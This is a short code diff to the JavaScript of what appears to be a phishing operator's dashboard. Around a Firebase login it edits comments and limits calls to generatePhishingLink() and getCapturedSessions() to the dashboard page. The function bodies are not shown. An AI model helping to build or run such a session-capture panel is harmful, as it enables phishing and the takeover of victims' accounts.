@@ -1,13 +1,13 @@
 console.log("✅ Script.js loaded successfully");
 
-// Ensure Firebase is ready before use
+// Ensure Firebase is initialized before using authentication
 if (typeof firebase === 'undefined') {
     console.error("❌ Firebase is NOT defined. Check firebase-config.js.");
 } else {
     console.log("✅ Firebase is available.");
 }
 
-// Login function
+// LOGIN FUNCTION
 document.getElementById("loginBtn").addEventListener("click", function () {
     const email = document.getElementById("email").value;
     const password = document.getElementById("password").value;
@@ -52,6 +52,8 @@ async function getCapturedSessions() {
     }
 }
 
-// Example calls (Make sure buttons call these functions)
-generatePhishingLink();
-getCapturedSessions();
+// Ensure API is called only on Dashboard page
+if (window.location.pathname.includes("dashboard.html")) {
+    generatePhishingLink();
+    getCapturedSessions();
+}
